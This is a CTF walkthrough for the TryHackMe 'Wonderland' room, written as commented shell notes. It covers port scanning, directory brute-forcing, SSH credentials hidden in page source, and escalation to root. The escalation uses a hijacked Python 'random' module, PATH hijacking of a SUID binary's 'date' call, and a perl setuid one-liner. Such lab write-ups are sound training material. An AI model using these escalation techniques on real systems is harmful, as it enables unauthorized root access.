# Wonderland
# Fall down the rabbit hole and enter wonderland.
#
# Difficulty: medium
# 
# Questions:
# 1. Obtain the flag in user.txt
# 2. Escalate your privileges, what is the flag in root.txt?

# Adding ip to environment variables
export IP=10.10.28.142

# Scanning open ports via nmap
nmap $IP -sT -sV -sV -oA nmap/res

Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-14 14:52 EST
Nmap scan report for 10.10.28.142
Host is up (0.058s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.02 seconds

# Going to the web site
# Nothing interesting in page sources
# Dirbusting web site
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out -x php,sh,txt,js,css,html,py,dic

# Found /r directory
# A the page there is a quatation that says follow the rabbit
# So r is the first letter of the rabbit word
# Let's try to enter after /r /a
# Yeah! That works. There is a dialog between cat and Alice
# Going on...

# So after typing /r/a/b/b/i/t/ we have page with following text
"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."

Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"

"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."

# Trying dirbusting in the last directory
gobuster dir -u http://$IP/r/a/b/b/i/t/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out -x php,sh,txt,js,css,html,py,dic

# While dirbusting, let's see page source code
# Found hidden element 
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>

# Seems like login:password
# Let's try to get ssh session using this credentials
# Yeap! We are at the machine

# In the /home/alice directoy there is to files root.txt (no permission to read) and walrus_and_the_carpenter.py file with following code
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

[...]

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
# I don't see user.txt file

# There are also some more users
hatter  rabbit  tryhackme
# No access to their directories 

# Let's try linpeas
# Found CVE-2021-4043. I can but it's too easy)
# Also found /usr/bin/perl files with SUID of root, but they can be run only buy Hatter user

# user flag was located in /root floder. There is a little bit logicaly to tell the truth...

# Let's see sudo permissions for alice user
sudo -l

Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

# So we can run python script as rabbit user
# Hmmmmm... That python script imports random module. 
# So we can create another random module that will bo located nearby than default random module
echo "import os; os.system('/bin/bash')" > random.py

# Getting rabbit session:
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

# So we are in rebbit user
# Let's see entries of the /home/rabbit
# There is one file teaParty
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty

# Let's see what does it hide from us
# Compiled binary file
# Execution
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 14 Dec 2022 21:56:16 +0000
Ask very nicely, and I will give you some tea while you wait for him

# Printing file to stdout show us something interesting
# Between strings of the text there is such a command
/bin/echo -n 'Probably by ' && date --date='next hour' -R

# date tool is called without specifying path
# So we can rewrite path variable, adding to the top our "date" tool, that will give us a shell of hatter user

# We have catched hatter user

# In the hatter directory password.txt file is located
WhyIsARavenLikeAWritingDesk?

# So let's go login to ssh as hatter as we have its password,
# because at current moment we are located at the process of teaParty sript
# which locate at the process of python script of alice user 


# So using perl with cap_setudi+ep capabilities we can login as root
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# Machine is pwned!
